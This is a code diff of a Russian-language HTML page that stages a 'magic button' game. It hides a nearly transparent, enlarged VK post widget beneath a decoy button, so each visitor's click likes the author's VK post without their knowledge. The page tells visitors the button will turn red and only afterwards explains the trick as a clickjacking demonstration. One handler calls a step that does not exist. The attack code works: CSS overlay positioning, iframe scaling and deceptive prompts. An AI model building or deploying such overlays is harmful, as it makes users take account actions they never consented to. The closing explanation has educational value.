@@ -4,16 +4,231 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <title>Волшебная кнопка</title>
-    <link rel="stylesheet" href="style.css" />
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap");
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        padding: 30px;
+        font-family: "Comic Neue", cursive;
+        background-color: #f9f9f9;
+        color: #333;
+        max-width: 600px;
+        margin: 0 auto;
+        text-align: center;
+        position: relative;
+      }
+
+      h1 {
+        color: #4a76a8;
+        margin-bottom: 20px;
+      }
+
+      .container {
+        position: relative;
+        margin: 20px 0;
+      }
+
+      .main {
+        width: 200px;
+        align-items: center;
+        justify-content: center;
+
+        height: 50px;
+        position: relative;
+        overflow: hidden;
+        z-index: 500;
+
+        border-radius: 5px;
+      }
+
+      .button {
+        width: 200px;
+        height: 50px;
+        opacity: 1;
+        background-color: #5181b8;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 18px;
+        font-family: "Comic Neue", cursive;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .buttons {
+        display: none;
+        z-index: 505;
+      }
+
+      .buttons.active {
+        display: block;
+      }
+
+      .button:hover {
+        background-color: #4a76a8;
+      }
+
+      .step {
+        position: absolute;
+        opacity: 0;
+        margin: 20px 0;
+
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .step.active {
+        opacity: 1;
+        top: 0;
+      }
+
+      #vk_post_486373634_846 {
+        opacity: 0.3;
+        position: absolute;
+        bottom: 2936px;
+        left: 3110px;
+      }
+
+      #vk_post_486373634_846 iframe {
+        transform: scale(15);
+      }
+
+      #vk_auth {
+        position: relative;
+        z-index: 1;
+        opacity: 0;
+      }
+
+      #vk_auth::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: white;
+        opacity: 1;
+        z-index: 1;
+      }
+
+      .result-buttons {
+        margin-top: 20px;
+      }
+
+      .result-buttons button {
+        margin: 0 10px;
+        padding: 10px 20px;
+        background-color: #5181b8;
+        color: white;
+        border: none;
+        font-family: "Comic Neue", cursive;
+        cursor: pointer;
+      }
+
+      .explanation {
+        background-color: #f2f6fa;
+        border-radius: 10px;
+        padding: 20px;
+        margin-top: 20px;
+        text-align: left;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+
+        max-width: 400px;
+      }
+
+      .explanation img {
+        max-width: 100%;
+      }
+
+      .loader {
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid #3498db;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 2s linear infinite;
+        margin: 20px auto;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
   </head>
 
   <body>
-    <p id="status-text">Загрузка...</p>
-    <div id="main" class="main">
-      <button class="button" id="action-button">Клик</button>
-      <div id="vk_post_486373634_846"></div>
+    <div id="step1" class="step active">
+      <h1>Волшебная кнопка</h1>
+      <div class="loader"></div>
+      <p id="status-text">Загрузка интерактивного эксперимента...</p>
     </div>
+
+    <div id="step2" class="step">
+      <h1>Испытание кнопки</h1>
+      <p>
+        Перед тобой особенная кнопка! Попробуй нажать на неё и посмотри, что
+        произойдет.
+      </p>
+      <div class="main">
+        <button class="button" id="action-button">Нажми меня!</button>
+        <div id="vk_post_486373634_846"></div>
+      </div>
+
+      <div id="buttons" class="buttons">
+        <h1>Что произошло?</h1>
+        <p>Стала ли кнопка красной после нажатия?</p>
+        <div class="result-buttons">
+          <button id="yes-button">Да, стала красной</button>
+          <button id="no-button">Нет, ничего не изменилось</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="step4" class="step">
+      <h1>Вот это да!</h1>
+      <p>Ты только что поставил(а) лайк моей аватарке ВКонтакте! 👍</p>
+      <div class="explanation">
+        <h3>Как это произошло?</h3>
+        <p>Это демонстрация атаки "Clickjacking" или "обман кликов":</p>
+        <ol>
+          <li>На сайте был скрыт интерфейс ВКонтакте</li>
+          <li>
+            Кнопка "Нажми меня" была размещена прямо над кнопкой "Нравится"
+          </li>
+          <li>
+            Когда ты нажал(а) на видимую кнопку, клик прошел через нее на
+            скрытый элемент ВКонтакте
+          </li>
+        </ol>
+        <p>
+          Таким образом, злоумышленники могут заставить пользователей совершать
+          действия на других сайтах, не получая их согласия.
+        </p>
+        <div>
+          <img src="./clickjacking1.jpg" alt="clickjacking1" />
+          <img src="./clickjacking2.jpg" alt="clickjacking2" />
+        </div>
+        <p>
+          <strong
+            >Будьте внимательны к сайтам, которые вы посещаете, и кнопкам, на
+            которые нажимаете!</strong
+          >
+        </p>
+      </div>
+    </div>
+
     <div id="vk_auth"></div>
+
     <script
       type="text/javascript"
       src="https://vk.com/js/api/openapi.js?173"
@@ -22,9 +237,40 @@
       (function () {
         let isAuthLoading = true;
         let isAuthSuccess = false;
+        const loader = document.querySelector(".loader");
         const statusText = document.getElementById("status-text");
         const fakeButton = document.getElementById("main");
         const button = document.getElementById("action-button");
+
+        // Управление шагами
+        function showStep(stepNumber) {
+          document.querySelectorAll(".step").forEach((step) => {
+            step.classList.remove("active");
+          });
+          document.getElementById("step" + stepNumber).classList.add("active");
+        }
+
+        function showButtons() {
+          document.getElementById("buttons").classList.add("active");
+        }
+
+        function dontShowButtons() {
+          document.getElementById("buttons").classList.remove("active");
+        }
+
+        // Настройка кнопок для проверки результата
+        document
+          .getElementById("yes-button")
+          .addEventListener("click", function () {
+            showStep(4);
+          });
+
+        document
+          .getElementById("no-button")
+          .addEventListener("click", function () {
+            showStep(2);
+            dontShowButtons();
+          });
 
         VK.init({
           apiId: 52818261,
@@ -47,6 +293,7 @@
               if (iframeHeight < 145) {
                 statusText.textContent =
                   "Фокус не сработает :( попробуйте другой браузер или зайдите с компьютера";
+                loader.style.display = "none";
                 iframe.style.display = "none";
                 fakeButton.style.display = "none";
               } else {
@@ -71,11 +318,45 @@
               486373634,
               846,
               "vL296BG5fZmCUmcuiTj9kNBgOmuy",
-              { width: 30 }
+              { width: 500 }
             );
           }
 
           if (iframe) {
+            // Получаем контейнер виджета
+            const container = document.querySelector(".main");
+            let interactedWithWidget = false;
+            let interactionTimer = null;
+
+            // Отслеживаем наведение на виджет
+            container.addEventListener("mouseenter", function () {
+              clearTimeout(interactionTimer);
+              interactionTimer = setTimeout(function () {
+                interactedWithWidget = true;
+                console.log("Пользователь начал взаимодействие с виджетом");
+              }, 500); // Задержка в 500мс, чтобы не считать случайные наведения
+            });
+
+            // Отслеживаем уход мыши с виджета
+            container.addEventListener("mouseleave", function () {
+              if (interactedWithWidget) {
+                console.log("Пользователь закончил взаимодействие с виджетом");
+
+                // Ждем некоторое время и проверяем, изменился ли счетчик лайков
+                setTimeout(function () {
+                  // Здесь можно проверить изменения в DOM или другие признаки взаимодействия
+                  // Например, сравнить текущий и предыдущий HTML виджета
+                  var currentHTML = container.innerHTML;
+                  // ... логика проверки изменений
+
+                  showButtons();
+                }, 300);
+
+                interactedWithWidget = false;
+              }
+              clearTimeout(interactionTimer);
+            });
+
             // Если iframe загрузился, прекращаем мониторинг
             iframe.onload = () => {
               if (isAuthLoading) return;
@@ -84,9 +365,26 @@
 
               if (!isAuthSuccess) return;
 
-              statusText.textContent =
-                "Почувствуй себя фронтендером. \nТебе необходимо покрасить кнопочку одним нажатием :D";
-              button.style.opacity = "1";
+              // Переход ко второму шагу после загрузки
+              showStep(2);
+
+              const iframe = document.querySelector(
+                "#vk_post_486373634_846 iframe"
+              );
+
+              const iframeContainer = document.querySelector(
+                "#vk_post_486373634_846"
+              );
+
+              console.log("iframeContainer", iframeContainer);
+
+              // Настройка обработчика клика на кнопку
+              button.addEventListener("click", function () {
+                setTimeout(() => {
+                  // Переход к шагу проверки после клика
+                  showStep(3);
+                }, 500);
+              });
             };
           }
         }, 100);
